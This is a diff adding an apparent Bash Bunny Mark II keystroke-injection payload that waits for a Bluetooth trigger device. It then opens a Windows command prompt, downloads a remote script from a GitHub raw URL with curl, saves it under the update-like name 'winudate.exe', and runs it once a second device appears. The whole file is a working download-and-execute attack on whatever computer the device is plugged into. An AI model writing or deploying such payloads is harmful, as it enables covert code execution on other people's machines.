@@ -1,0 +1,47 @@
+#
+# Remote Trigger with bluetooth for Bash Bunny Mark II Example
+#
+
+######## INITIALIZATION ########
+
+readonly PAYLOAD_DOWNLOAD_URI="https://raw.githubusercontent.com/SlyJose/whatdoyoumeanthisispii/main/remote.sh"
+
+###############################
+
+LED SETUP
+
+#
+# Stage 1: Hidden USB on Dock
+#
+ATTACKMODE HID
+LED STAGE1
+WAIT_FOR_PRESENT Find Me        #'Find Me' is the ID used to find the triggering device
+
+#
+# Stage 2: Obtain payload
+#
+LED STAGE2
+
+Q GUI r
+Q STRING "cmd"
+Q ENTER
+Q DELAY 1000
+Q STRING "cd %USERPROFILE%"
+Q ENTER
+Q DELAY 1000
+Q STRING "curl ${PAYLOAD_DOWNLOAD_URI} --output winudate.exe"
+Q ENTER
+Q DELAY 3000
+WAIT_FOR_PRESENT Glucose
+
+#
+# Stage 3: Execute and cleanup
+#
+LED STAGE3
+
+
+
+
+Q STRING winudate.exe
+Q ENTER
+Q DELAY 2500
